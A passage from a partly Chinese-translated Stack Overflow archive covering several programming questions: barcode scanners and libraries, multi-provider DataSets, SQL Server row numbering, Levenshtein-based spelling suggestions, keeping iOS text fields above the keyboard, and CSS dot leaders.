读取条码非常简单，因为扫描仪模拟键盘。所以你只需要扫描而不是打字。我们有几个内部网络应用程序，这些应用程序用于仅配备扫描仪和轨迹球的个人电脑 - 根本没有键盘。这种设置不需要特殊的驱动程序。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2009-01-27T19:32:39.643

条形码有[很多不同的格式](http://www.taltech.com/TALtech_web/resources/intro_to_bc/bcsymbol.htm)。

如果您还没有与编程语言或[条形码扫描仪供应商](http://www.barcodediscount.com/cats/barcode-scanners/)绑定，最好的地方是与扫描仪供应商一起查看他们提供的库。根据供应商向开发人员提供的库，您可能会找到一个很好的匹配项。

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2009-05-08T04:34:50.890

我为 iPhone [Wallet Zero Home Page](http://www.eleganttechnologies.com/aboutwalletzero "会员卡应用程序的描述")开发了 Wallet Zero ，它生成的条形码与会员卡上的条形码相匹配。在研究它时，我发现了一些很好的参考资料和资源（其他人已经提到了一些）：

*   [关于条形码的基础知识](http://www.barcodediscount.com/solutions/library/barcode_basics.htm)
*   [每种格式都有很多细节](http://www.teklynx.com/barcodes/article_17.html)
*   [条形码圣经——这本书非常有价值，物有所值。这是](https://rads.stackoverflow.com/amzn/click/com/1425133746 "亚马逊") 我唯一买的一本书。如果没有实体书，我认为我不会走得太远。
*   [在线生成器和 PS](http://www.terryburton.co.uk/barcodewriter/generator/)这家伙有一个很棒的网站，一个非常有价值的条形码生成器，当你刚开始的时候非常棒，还有一些开源的 postscript 代码。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2009-01-27T19:49:46.787

大多数条码阅读器都非常简单——就 PC 而言，它们只是键盘输入。大多数当前的扫描仪可以自动读取和破译各种编码方案。它们可以配置为发送特殊的前缀/后缀，以便您的应用程序可以检测到来自扫描仪的输入，而不仅仅是键盘。大多数扫描仪还可以配置为告诉您正在扫描的条形码类型，如果这对您很重要的话。

有些条码只有数字，有些是字母数字。您可能希望确保将数据库设计为允许使用字母数字数据，除非您确定您只会处理数字。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2009-01-27T19:54:40.223

由于您没有指定任何语言，您应该看看[Real World Haskell的第 12 章](http://book.realworldhaskell.org/read/barcode-recognition.html)

这可能不是您想要的，但可能很有趣/有帮助。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2009-05-08T05:10:40.883

您必须[查看 CueCat](http://www.joelonsoftware.com/articles/fog0000000037.html)。
:-)

# c# - Strongly Typed DataSet with a set of TableAdapters per database provider?

> ID：484851
> 
> 赞同：2
> 
> 时间：2009-01-27T19:27:21.450
> 
> 标签：c#, database, strongly-typed-dataset

I want a strongly-typed DataSet along with designer TableAdapters, but Visual Studio's DataSet designer generates provider-specific (e.g. SQL Server vs. MySql) code and I don't want to commit to just one provider. An ORM would help, but:

*   Entity Framework is 3.5 only and doesn't play nice with DataSets, and
*   NHibernate doesn't support SQLite.

Here's what I've come up with:

"DataSets.Masters" contains a completely designed DataSet bound to some particular provider (e.g. SqlClient), including:

*   a **CustomTableAdapter** component, subclassed by each designer **TableAdapter**,
*   an **ITableAdapterManager** interface, implemented by designer's **TableAdapterManager** for hierarchical updates.

Everything *except* the **DataSets.MyDataSetTableAdapters** namespace is copied into the "DataSets" project, where all the TableAdapter code (along with xs:annotation) is removed.

The **DataSets.MyDataSetTableAdapters** namespace, along with MyDataSet.xsd etc., is copied and customized into each of "DataSets.SqlClient", "DataSets.SQLite", etc. each of which references the "DataSets" assembly.

Now I just have to choose the right assembly to load my **ITableAdapterManager** implementation from, based on any given connection string. When the table schema changes, I modify the Masters assembly, copy code to the production assemblies, and run a few tests.

So my question: am I making this too difficult? DataSets are so standard, and the need to support multiple database engines via the data access layer is so common, is there a method that doesn't involve copy, paste, and search & replace? What do *you* do?

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-01-27T19:43:07.423

NHibernate does support SQLite [http://www.hibernate.org/361.html](http://www.hibernate.org/361.html#A9).

I recommend using NHibernate combined with [Fluent NHibernate](http://groups.google.com/group/fluent-nhibernate). Fluent NHibernate is a library that allows you to use NHibernate without needing to deal with any xml yourself which in my opinion is NHibernate's greatest drawback.

Also Fluent NHibernate supports an auto persistence model that if your domain objects are close to your database schema you can automap your entire business domain without writing mapping code for every single object. The further your business objects differ from your database the more complex it becomes to use the automapping features of Fluent NHibernate and it's worth using static mapping.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-01-27T22:26:46.673

It might be easier to simply ignore the autogenerated TableAdapter commands and use the [ADO.Net data access factory objects](http://msdn.microsoft.com/en-us/library/fks3666w.aspx) when it's time for your CRUD operations. That way you can use DbProviderFactory.CreateCommandBuilder to correctly format the parameters in the CRUD operations. Note that this assumes that you aren't doing any tricky property mapping and your schema will remain consistent across data providers.

An aditional option if you use this technique is to create a class that you can enter as the BaseClass property on your TableAdapters. Add an "init"-type method that overrides the connection and the insert, delete, select, and update commands with ones from the factory (based on the auto-generated select command—which **should** be compatible across most providers).

# sql-server - 可以选择在结果表中添加一个新字段吗？

> ID：484852
> 
> 赞同：2
> 
> 时间：2009-01-27T19:27:22.667
> 
> 标签：sql-server, tsql, select

我在 SQL Server 2005 中有一条 SQL 语句，看起来像这样：

```
SELECT * INTO #TempTable FROM FirstTable WHERE <complex where clause> 
```

我真正想要的是让生成的临时表有一个额外的字段，该字段本质上是一个从 1 向上计数的整数字段，按照 where 子句返回记录的顺序。

这可能吗？

（本质上，我希望能够返回从第一个 select 语句返回的记录的子集，沿着“第 45 到 179 行”的行。）

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2009-01-27T19:32:50.470

试试这个，使用[Row_Number](http://msdn.microsoft.com/en-us/library/ms186734.aspx)：

```
-- insert into temp table
SELECT *, 
  ROW_NUMBER() OVER (ORDER BY SortColumn) AS SortColumn INTO #TempTable 
FROM FirstTable 
WHERE <complex where clause>

-- check the results and drop the table
SELECT * FROM #TempTable WHERE SortColumn BETWEEN 45 AND 179 ORDER BY SortColumn
DROP TABLE  #TempTable 
```

显然，您需要`SortColumn`用对您的情况有意义的内容进行替换

* * *

**编辑：**

如果你只是想进行分页，有很多这样的例子：

*   [http://www.davidhayden.com/blog/dave/archive/2005/12/30/2652.aspx](http://www.davidhayden.com/blog/dave/archive/2005/12/30/2652.aspx)
*   [http://www.sqlteam.com/article/server-side-paging-using-sql-server-2005](http://www.sqlteam.com/article/server-side-paging-using-sql-server-2005)
*   [http://www.google.com/search?q=sql+server+2005+paging](http://www.google.com/search?q=sql+server+2005+paging)

# c++ - Levenshtein 算法：如何满足这个文本编辑要求？

> ID：484853
> 
> 赞同：3
> 
> 时间：2009-01-27T19:27:25.973
> 
> 标签：c++, algorithm, pattern-matching, levenshtein-distance

我正在使用 levenshtein 算法来满足这些要求：

当找到一个包含 N 个字符的单词时，在我的字典数据库中建议作为更正的单词是：

与找到的单词有1个字符差异的每个N个字符的字典单词。示例：找到的单词：bearn，字典单词：bears

每个 N+1 个字符的字典单词，其中 N 个字符等于找到的单词。示例：找到的单词：bear，字典单词：bears

每个包含 N-1 个字符的字典单词，其中 N-1 个字符等于找到的单词。示例：找到的词：熊，字典词：熊

我在 C++ 中使用这个 Levenshtein 算法的实现来查找单词的 Levenshtein 编号何时为 1（这是所有三种情况的 Levenshtein 编号），但是我该如何选择要建议的单词呢？我读过有关 Boyer-Moore-Horspool 和 Knuth-Morris-Pratt 的文章，但我不确定它们中的任何一个有什么帮助。

```
#include <string>
#include <vector>
#include <algorithm>

using namespace std;

int levenshtein(const string &s1, const string &s2)
{
   string::size_type N1 = s1.length();
   string::size_type N2 = s2.length();
   string::size_type i, j;
   vector<int> T(N2+1);

   for ( i = 0; i <= N2; i++ )
      T[i] = i;

   for ( i = 0; i < N1; i++ ) {
      T[0] = i+1;
      int corner = i;
      for ( j = 0; j < N2; j++ ) {
         int upper = T[j+1];
         if ( s1[i] == s2[j] )
            T[j+1] = corner;
         else
            T[j+1] = min(T[j], min(upper, corner)) + 1;
         corner = upper;
      }
   }
   return T[N2];
} 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2009-01-27T19:30:21.647

您可能还想将[Norvig 关于拼写更正的优秀文章](http://norvig.com/spell-correct.html)添加到您的阅读中。

我已经有一段时间没有阅读它了，但我记得它与您所写的非常相似。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-01-27T20:00:03.787

正如我在其他地方所说，Boyer-Moore 并不真正适合这个。既然你想同时搜索多个stings，那么Wu和Manber的算法应该更符合你的喜好。

我已经发布了一个概念证明 C++ 代码来回答[另一个问题](https://stackoverflow.com/questions/154365/search-25-000-words-within-a-text#154410)。注意那里提到的警告。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-01-27T19:58:03.713

为什么将建议限制在一个单词，为什么不包括一组单词？如果您仅限于一个单词，您可以通过一些预先计算的使用频率或其他东西对结果进行排序。该频率可以根据用户从建议中选择的内容进行更新。

此外，在原始单词中没有拼写错误的情况下，您可能希望优先处理 N+1 个案例，这更像是自动完成。无论如何，我认为没有一种正确的方法可以做到这一点，也许如果您的要求更具体，缩小范围会更容易。

此外，您无需了解 Python 即可理解 Norvig 文章中描述的算法。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-01-27T20:11:45.027

如果我对您的理解正确，那么您的问题没有正确答案。您正在使用 Levenshtein 为给定单词识别多达三个建议 - 由您提出一个规则来决定使用哪个以及过滤掉哪些。或者也许你应该全部使用它们？

有趣的是，您可能会对 Levenshtein 的 Damerau 扩展感兴趣，其中两个交换的字符也被认为给出 1 分，而不是 2，这是原版 Levenshtein 所返回的。

# objective-c - 如何以编程方式移动 UIScrollView 以集中在键盘上方的控件中？

> ID：484855
> 
> 赞同：51
> 
> 时间：2009-01-27T19:27:45.207
> 
> 标签：objective-c, iphone, user-interface

我有 6`UITextFields`个`UIScrollView`。现在，我可以按用户请求滚动。但是当键盘出现时，一些文本字段被隐藏了。

这不是用户友好的。

**如何以编程方式滚动视图以确保键盘不会隐藏文本字段？**

* * *

## 回答 #1

> 赞同：79
> 
> 时间：2010-03-18T07:46:26.357

这对我有用。*在为键盘调整视图之前*，拥有一个保存 UIScrollView 偏移值的实例变量，这样您就可以在 UITextField 返回后恢复之前的状态：

```
//header
@interface TheViewController : UIViewController <UITextFieldDelegate> {
    CGPoint svos;
}

//implementation
- (void)textFieldDidBeginEditing:(UITextField *)textField {
    svos = scrollView.contentOffset;
    CGPoint pt;
    CGRect rc = [textField bounds];
    rc = [textField convertRect:rc toView:scrollView];
    pt = rc.origin;
    pt.x = 0;
    pt.y -= 60;
    [scrollView setContentOffset:pt animated:YES];           
}

- (BOOL)textFieldShouldReturn:(UITextField *)textField {
    [scrollView setContentOffset:svos animated:YES]; 
    [textField resignFirstResponder];
    return YES;
} 
```

* * *

## 回答 #2

> 赞同：38
> 
> 时间：2009-02-03T01:26:55.367

最后，一个简单的修复：

```
UIScrollView* v = (UIScrollView*) self.view ;
CGRect rc = [textField bounds];
rc = [textField convertRect:rc toView:v];
rc.origin.x = 0 ;
rc.origin.y -= 60 ;

rc.size.height = 400;
[self.scroll scrollRectToVisible:rc animated:YES]; 
```

现在我认为只是将它与上面的链接结合起来并设置！

* * *

## 回答 #3

> 赞同：21
> 
> 时间：2011-04-12T11:34:24.847

我将一个通用的、插入式的 UIScrollView 和 UITableView 子类放在一起，负责将其中的所有文本字段移到键盘之外。

当键盘即将出现时，子类将找到即将编辑的子视图，并调整其框架和内容偏移以确保该视图可见，并带有与键盘弹出框相匹配的动画。当键盘消失时，它会恢复其先前的大小。

它应该适用于基本上任何设置，无论是基于 UITableView 的界面，还是由手动放置的视图组成的界面。

[在这里](http://atastypixel.com/blog/a-drop-in-universal-solution-for-moving-text-fields-out-of-the-way-of-the-keyboard/)。

* * *

```
(For google: TPKeyboardAvoiding, TPKeyboardAvoidingScrollView, TPKeyboardAvoidingCollectionView.)
Editor's note: TPKeyboardAvoiding seems to be continually updated and fresh, as of 2014. 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2009-01-27T22:31:23.903

如果`delegate`将文本字段的 设置为程序中的控制器对象，则可以让该对象实现`textFieldDidBeginEditing:`和`textFieldShouldReturn:`方法。然后可以使用第一种方法滚动到您的文本字段，然后可以使用第二种方法向后滚动。

您可以在我的博客中找到我为此使用的代码：[Sliding UITextViews around to Avoid the keyboard](http://cocoawithlove.com/2008/10/sliding-uitextfields-around-to-avoid.html)。我没有在 a 中测试此代码的文本视图，`UIScrollView`但它应该可以工作。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2014-06-23T10:11:04.810

简单而最好的

```
- (void)textFieldDidBeginEditing:(UITextField *)textField
{

  // self.scrlViewUI.contentOffset = CGPointMake(0, textField.frame.origin.y);
    [_scrlViewUI setContentOffset:CGPointMake(0,textField.center.y-90) animated:YES];
    tes=YES;
    [self viewDidLayoutSubviews];
} 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-08-21T10:51:51.757

到目前为止发布的答案对我不起作用，因为我有一个非常深的 UIViews 嵌套结构。此外，我遇到的问题是其中一些答案仅适用于某些设备方向。

这是我的解决方案，希望能让你在这方面浪费更少的时间。

我的 UIViewTextView 派生自 UIView，是一个 UITextView 委托，并在从该 UITextView 的 XML 文件中读取了一些参数后添加了一个 UITextView（为清楚起见，此处省略了该 XML 部分）。

这是私有接口定义：

```
#import "UIViewTextView.h"
#import <CoreGraphics/CoreGraphics.h>
#import <CoreGraphics/CGColor.h>

@interface UIViewTextView (/**/) {
  @private
  UITextView *tf;

  /*
   * Current content scroll view
   * position and frame
   */
  CGFloat currentScrollViewPosition;
  CGFloat currentScrollViewHeight;
  CGFloat kbHeight;
  CGFloat kbTop;

  /*
   * contentScrollView is the UIScrollView
   * that contains ourselves.
   */
  UIScrollView contentScrollView;
}
@end 
```

在 init 方法中，我必须注册事件处理程序：

```
@implementation UIViewTextView

- (id) initWithScrollView:(UIScrollView*)scrollView {
  self              = [super init];

  if (self) {
    contentScrollView = scrollView;

    // ...

    tf = [[UITextView alloc] initWithFrame:CGRectMake(0, 0, 241, 31)];

    // ... configure tf and fetch data for it ...

    tf.delegate = self;

    // ...

    NSNotificationCenter *nc = [NSNotificationCenter defaultCenter];
    [nc addObserver:self selector:@selector(keyboardWasShown:) name: UIKeyboardWillShowNotification object:nil];
    [nc addObserver:self selector:@selector(keyboardWasHidden:) name: UIKeyboardWillHideNotification object:nil];
    [self addSubview:tf];
  }

  return(self);
} 
```

完成后，我们需要处理键盘显示事件。这在调用 textViewBeginEditing 之前被调用，因此我们可以使用它来找出键盘的一些属性。本质上，我们想知道键盘的高度。不幸的是，这需要从横向模式下的宽度属性中获取：

```
-(void)keyboardWasShown:(NSNotification*)aNotification {
  NSDictionary* info                 = [aNotification userInfo];
  CGRect kbRect                      = [[info objectForKey:UIKeyboardFrameBeginUserInfoKey] CGRectValue];
  CGSize kbSize                      = kbRect.size;

  CGRect screenRect                  = [[UIScreen mainScreen] bounds];
  CGFloat sWidth                     = screenRect.size.width;
  CGFloat sHeight                    = screenRect.size.height;

  UIInterfaceOrientation orientation = [[UIApplication sharedApplication] statusBarOrientation];

  if ((orientation == UIDeviceOrientationPortrait)
      ||(orientation == UIDeviceOrientationPortraitUpsideDown)) {
    kbHeight     = kbSize.height;
    kbTop        = sHeight - kbHeight;
  } else {
    //Note that the keyboard size is not oriented
    //so use width property instead
    kbHeight     = kbSize.width;
    kbTop        = sWidth - kbHeight;
  } 
```

接下来，我们需要在开始编辑时实际滚动。我们在这里这样做：

```
- (void) textViewDidBeginEditing:(UITextView *)textView {
  /*
   * Memorize the current scroll position
   */
  currentScrollViewPosition = contentScrollView.contentOffset.y;

  /*
   * Memorize the current scroll view height
   */
  currentScrollViewHeight   = contentScrollView.frame.size.height;

  // My top position
  CGFloat myTop    = [self convertPoint:self.bounds.origin toView:[UIApplication sharedApplication].keyWindow.rootViewController.view].y;

  // My height
  CGFloat myHeight = self.frame.size.height;

  // My bottom
  CGFloat myBottom = myTop + myHeight;

  // Eventual overlap
  CGFloat overlap  = myBottom - kbTop;

  /*
   * If there's no overlap, there's nothing to do.
   */
  if (overlap < 0) {
    return;
  }

  /*
   * Calculate the new height
   */
  CGRect crect = contentScrollView.frame;
  CGRect nrect = CGRectMake(crect.origin.x, crect.origin.y, crect.size.width, currentScrollViewHeight + overlap);

  /*
   * Set the new height
   */
  [contentScrollView setFrame:nrect];

  /*
   * Set the new scroll position
   */
  CGPoint npos;

  npos.x = contentScrollView.contentOffset.x;
  npos.y = contentScrollView.contentOffset.y + overlap;

  [contentScrollView setContentOffset:npos animated:NO];
} 
```

当我们结束编辑时，我们这样做是为了重置滚动位置：

```
- (void) textViewDidEndEditing:(UITextView *)textView {
  /*
   * Reset the scroll view position
   */
  CGRect crect = contentScrollView.frame;
  CGRect nrect = CGRectMake(crect.origin.x, crect.origin.y, crect.size.width, currentScrollViewHeight);

  [contentScrollView setFrame:nrect];

  /*
   * Reset the scroll view height
   */
  CGPoint npos;

  npos.x = contentScrollView.contentOffset.x;
  npos.y = currentScrollViewPosition;

  [contentScrollView setContentOffset:npos animated:YES];
  [tf resignFirstResponder];

  // ... do something with your data ...

} 
```

键盘中没有什么可做的是隐藏的事件处理程序；无论如何，我们将其保留：

```
-(void)keyboardWasHidden:(NSNotification*)aNotification {
} 
```

就是这样。

```
/*
   // Only override drawRect: if you perform custom drawing.
   // An empty implementation adversely affects performance during animation.
   - (void)drawRect:(CGRect)rect
   {
   // Drawing code
   }
 */

@end 
```

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2013-03-01T17:17:10.123

我知道这已经过时了，但上述解决方案仍然没有一个具有“完美”无错误、向后兼容和无闪烁动画所需的所有花哨的定位内容。
让我分享我的解决方案（假设您已经设置`UIKeyboardWill(Show|Hide)Notification`）：

```
// Called when UIKeyboardWillShowNotification is sent
- (void)keyboardWillShow:(NSNotification*)notification
{
    // if we have no view or are not visible in any window, we don't care
    if (!self.isViewLoaded || !self.view.window) {
        return;
    }

    NSDictionary *userInfo = [notification userInfo];

    CGRect keyboardFrameInWindow;
    [[userInfo objectForKey:UIKeyboardFrameEndUserInfoKey] getValue:&keyboardFrameInWindow];

    // the keyboard frame is specified in window-level coordinates. this calculates the frame as if it were a subview of our view, making it a sibling of the scroll view
    CGRect keyboardFrameInView = [self.view convertRect:keyboardFrameInWindow fromView:nil];

    CGRect scrollViewKeyboardIntersection = CGRectIntersection(_scrollView.frame, keyboardFrameInView);
    UIEdgeInsets newContentInsets = UIEdgeInsetsMake(0, 0, scrollViewKeyboardIntersection.size.height, 0);

    // this is an old animation method, but the only one that retains compaitiblity between parameters (duration, curve) and the values contained in the userInfo-Dictionary.
    [UIView beginAnimations:nil context:NULL];
    [UIView setAnimationDuration:[[userInfo objectForKey:UIKeyboardAnimationDurationUserInfoKey] doubleValue]];
    [UIView setAnimationCurve:[[userInfo objectForKey:UIKeyboardAnimationCurveUserInfoKey] intValue]];

    _scrollView.contentInset = newContentInsets;
    _scrollView.scrollIndicatorInsets = newContentInsets;

    /*
     * Depending on visual layout, _focusedControl should either be the input field (UITextField,..) or another element
     * that should be visible, e.g. a purchase button below an amount text field
     * it makes sense to set _focusedControl in delegates like -textFieldShouldBeginEditing: if you have multiple input fields
     */
    if (_focusedControl) {
        CGRect controlFrameInScrollView = [_scrollView convertRect:_focusedControl.bounds fromView:_focusedControl]; // if the control is a deep in the hierarchy below the scroll view, this will calculate the frame as if it were a direct subview
        controlFrameInScrollView = CGRectInset(controlFrameInScrollView, 0, -10); // replace 10 with any nice visual offset between control and keyboard or control and top of the scroll view.

        CGFloat controlVisualOffsetToTopOfScrollview = controlFrameInScrollView.origin.y - _scrollView.contentOffset.y;
        CGFloat controlVisualBottom = controlVisualOffsetToTopOfScrollview + controlFrameInScrollView.size.height;

        // this is the visible part of the scroll view that is not hidden by the keyboard
        CGFloat scrollViewVisibleHeight = _scrollView.frame.size.height - scrollViewKeyboardIntersection.size.height;

        if (controlVisualBottom > scrollViewVisibleHeight) { // check if the keyboard will hide the control in question
            // scroll up until the control is in place
            CGPoint newContentOffset = _scrollView.contentOffset;
            newContentOffset.y += (controlVisualBottom - scrollViewVisibleHeight);

            // make sure we don't set an impossible offset caused by the "nice visual offset"
            // if a control is at the bottom of the scroll view, it will end up just above the keyboard to eliminate scrolling inconsistencies
            newContentOffset.y = MIN(newContentOffset.y, _scrollView.contentSize.height - scrollViewVisibleHeight);

            [_scrollView setContentOffset:newContentOffset animated:NO]; // animated:NO because we have created our own animation context around this code
        } else if (controlFrameInScrollView.origin.y < _scrollView.contentOffset.y) {
            // if the control is not fully visible, make it so (useful if the user taps on a partially visible input field
            CGPoint newContentOffset = _scrollView.contentOffset;
            newContentOffset.y = controlFrameInScrollView.origin.y;

            [_scrollView setContentOffset:newContentOffset animated:NO]; // animated:NO because we have created our own animation context around this code
        }
    }

    [UIView commitAnimations];
}

// Called when the UIKeyboardWillHideNotification is sent
- (void)keyboardWillHide:(NSNotification*)notification
{
    // if we have no view or are not visible in any window, we don't care
    if (!self.isViewLoaded || !self.view.window) {
        return;
    }

    NSDictionary *userInfo = notification.userInfo;

    [UIView beginAnimations:nil context:NULL];
    [UIView setAnimationDuration:[[userInfo valueForKey:UIKeyboardAnimationDurationUserInfoKey] doubleValue]];
    [UIView setAnimationCurve:[[userInfo valueForKey:UIKeyboardAnimationCurveUserInfoKey] intValue]];

    // undo all that keyboardWillShow-magic
    // the scroll view will adjust its contentOffset apropriately
    _scrollView.contentInset = UIEdgeInsetsZero;
    _scrollView.scrollIndicatorInsets = UIEdgeInsetsZero;

    [UIView commitAnimations];
} 
```

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2014-03-31T16:00:35.470

您可以查看：[https](https://github.com/michaeltyson/TPKeyboardAvoiding) ://github.com/michaeltyson/TPKeyboardAvoiding （我在我的应用程序中使用了该示例）。它工作得很好。我希望这对你有帮助。

* * *

实际上，这里有一个关于使用 TPKeyboardAvoiding 的完整教程，它可能对某人有所帮助

(1)从 github 链接下载**zip 文件。**将这**四个**文件添加到您的 Xcode 项目中：

![在此处输入图像描述](https://i.stack.imgur.com/zI0qx.png)

(2) 在 IB 中建立你的美丽表格。添加一个 UIScrollView。 **将表单项放在滚动视图内**。（注意 -关于界面构建器的**非常有用的提示：** [https](https://stackoverflow.com/a/16952902/294884) ://stackoverflow.com/a/16952902/294884 ）

![在此处输入图像描述](https://i.stack.imgur.com/nth3J.png)

(3) 点击**滚动视图**。然后在右上角，第三个按钮，你会看到“UIScrollView”这个词。使用复制和粘贴，**将其更改为**“TPKeyboardAvoidingScrollView”

![在此处输入图像描述](https://i.stack.imgur.com/PeMVH.png)

(4) 就是这样。将应用程序放在应用程序商店中，然后向您的客户收费。

（另外，只需单击滚动视图的 Inspector 选项卡。您可能更喜欢打开或关闭弹跳和滚动条 - 您的偏好。）

*个人评论 - 我强烈建议在几乎所有情况下对输入表单使用滚动视图（或集合视图）。**不要使用表格视图。**由于许多原因，这是有问题的。很简单，使用滚动视图非常容易。以任何你想要的方式布置它。它在界面生成器中是 100% 所见即所得。希望能帮助到你*

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2015-01-29T09:25:30.683

这是我的代码，希望对你有帮助。如果您有很多文本字段，它可以正常工作

```
CGPoint contentOffset;
bool isScroll;
- (void)textFieldDidBeginEditing:(UITextField *)textField {
    contentOffset = self.myScroll.contentOffset;
    CGPoint newOffset;
    newOffset.x = contentOffset.x;
    newOffset.y = contentOffset.y;
    //check push return in keyboar
    if(!isScroll){
        //180 is height of keyboar
        newOffset.y += 180;
        isScroll=YES;
    }
   [self.myScroll setContentOffset:newOffset animated:YES];
}

- (BOOL)textFieldShouldReturn:(UITextField *)textField{
    //reset offset of content
    isScroll = NO;
    [self.myScroll setContentOffset:contentOffset animated:YES];
    [textField endEditing:true];
    return  true;
} 
```

我们有一个点 contentOffset 在键盘显示之前保存滚动视图的 contentoffset。然后我们将滚动 y 的内容约 180（键盘高度）。当您在键盘上触摸返回时，我们会将内容滚动到旧点（它是 contentOffset）。如果您有很多文本字段，则不要在键盘中触摸 return 而是触摸另一个文本字段，它将 +180 。所以我们有检查触摸返回

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2015-01-21T14:46:43.067

使用其中任何一个，

```
CGPoint bottomOffset = CGPointMake(0, self.MainScrollView.contentSize.height - self.MainScrollView.bounds.size.height);

[self.MainScrollView setContentOffset:bottomOffset animated:YES]; 
```

或者

```
[self.MainScrollView scrollRectToVisible:CGRectMake(0, self.MainScrollView.contentSize.height - self.MainScrollView.bounds.size.height-30, MainScrollView.frame.size.width, MainScrollView.frame.size.height) animated:YES]; 
```

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2015-08-31T07:35:27.750

我认为最好使用键盘通知，因为您不知道第一响应者（焦点所在的控件）是 textField 还是 textView（或其他）。所以只需创建一个类别来查找第一响应者：

```
#import "UIResponder+FirstResponder.h"

static __weak id currentFirstResponder;

@implementation UIResponder (FirstResponder)

+(id)currentFirstResponder {
   currentFirstResponder = nil;
   [[UIApplication sharedApplication] sendAction:@selector(findFirstResponder:) to:nil from:nil forEvent:nil];
   return currentFirstResponder;
}

-(void)findFirstResponder:(id)sender {
   currentFirstResponder = self;
}

@end 
```

然后

```
-(void)keyboardWillShowNotification:(NSNotification*)aNotification{

    contentScrollView.delegate=nil;
    contentScrollView.scrollEnabled=NO;
    contentScrollViewOriginalOffset = contentScrollView.contentOffset;

    UIResponder *lc_firstResponder = [UIResponder currentFirstResponder];
    if([lc_firstResponder isKindOfClass:[UIView class]]){

        UIView *lc_view = (UIView *)lc_firstResponder;

        CGRect lc_frame = [lc_view convertRect:lc_view.bounds toView:contentScrollView];
        CGPoint lc_point = CGPointMake(0, lc_frame.origin.y-lc_frame.size.height);
        [contentScrollView setContentOffset:lc_point animated:YES];
    }
} 
```

最终禁用滚动并将委托设置为 nil 然后将其恢复以避免在第一响应者的编辑期间执行某些操作。就像 james_womack 说的，保留原始偏移量以在keyboardWillHideNotification 方法中恢复它。

```
-(void)keyboardWillHideNotification:(NSNotification*)aNotification{

    contentScrollView.delegate=self;
    contentScrollView.scrollEnabled=YES;
    [contentScrollView setContentOffset:contentScrollViewOriginalOffset animated:YES];
} 
```

* * *

## 回答 #12

> 赞同：-1
> 
> 时间：2016-03-09T22:59:36.803

在 Swift 1.2+ 中做这样的事情：

```
class YourViewController: UIViewController, UITextFieldDelegate {

    override func viewDidLoad() {
        super.viewDidLoad()

        _yourTextField.delegate = self //make sure you have the delegate set to this view controller for each of your textFields so textFieldDidBeginEditing can be called for each one
        ...

    }

    func textFieldDidBeginEditing(textField: UITextField) {
        var point = textField.convertPoint(textField.frame.origin, toView: _yourScrollView)
        point.x = 0.0 //if your textField does not have an origin at 0 for x and you don't want your scrollView to shift left and right but rather just up and down
        _yourScrollView.setContentOffset(point, animated: true)
    }

    func textFieldDidEndEditing(textField: UITextField) {
        //Reset scrollview once done editing
        scrollView.setContentOffset(CGPoint.zero, animated: true)
    }

} 
```

# html - CSS中的填充背景/文本填充？

> ID：484857
> 
> 赞同：0
> 
> 时间：2009-01-27T19:28:34.130
> 
> 标签：html, ruby-on-rails, css

我想创建一个如下所示的表：

* * *

lolvalue---------|lol date|其他一些列数据1

lolvalue12345|lol date 2|其他一些列数据2

* * *

在 CSS/HTML 中。基本上，有“数据”，右边有一个填充物，但不算作数据，所以它不会拉伸列，填充由最大长度行拉伸的空间。

就像在那些旧的内容书中，有一些点将我们引导到正确的页面，记得吗？

我怎么能那样做？没有像“填充背景”这样的属性。我可能可以通过仅对一列使用图层来创建它，但是，我如何确定图层的宽度？

另一种方法是在软件中生成适当数量的字符，但是嗯，这不能跨字体和浏览器移植。

我将 Ruby on Rails 用于服务器端，如果它有所作为的话。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-01-27T19:48:17.913

您可以添加 a并使用内联元素（例如 a ）包装内部文本，并使用a`background-image`来包装内部文本：`td``span``background-color`

```
<style type="text/css">
  td      { background:url(dot.gif) 0 0 repeat-x; }
  td span { background-color:#fff; }
</style>

<table>
  <tr>
    <td><span>loltext</span></td>
    <td>loldate</td>
  </tr>
  <tr>
    <td><span>lolvalue12345</span></td>
    <td>lol date</td>
  </tr>
</table> 
```

这样，您就不需要指定宽度。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-01-27T19:33:24.433

我过去使用的一个快速作弊方法是用尾随字符（如'-----------------...'）填充所有字段，然后隐藏用 css 溢出。

```
<table>
   <tr>
      <td>lolvalue------------------------------------</td>
      <td>lol date</td>
   </tr>
   <tr>
      <td>lolvalue12345-------------------------------</td>
      <td>lol date</td>
   </tr>
</table> 
```

然后使用以下样式对其进行样式设置：

```
td { width:50px; overflow:hidden; } 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-01-28T01:44:05.073

```
css:
.extendo { background: url(dot.gif) 0 0 repeat-x; width: 100px; }
.words { background: none; }

markup:

<div class="extendo"><span class="words">lalala</span></div> 
```

您可能需要指定填充或备用背景

# c# - 是否有任何好的 Ruby、Rails 或 .Net 库可用于处理条形码？

> ID：484870
> 
> 赞同：0
> 
> 时间：2009-01-27T19:30:58.040
> 
> 标签：c#, .net, ruby-on-rails, ruby, barcode

有谁知道用于处理条形码的任何好的 Ruby、Rails 或 .Net 特定库？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-01-27T19:49:19.267

对于 ruby​​，有 barby gem 和 redux for rails

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-01-27T22:51:46.980

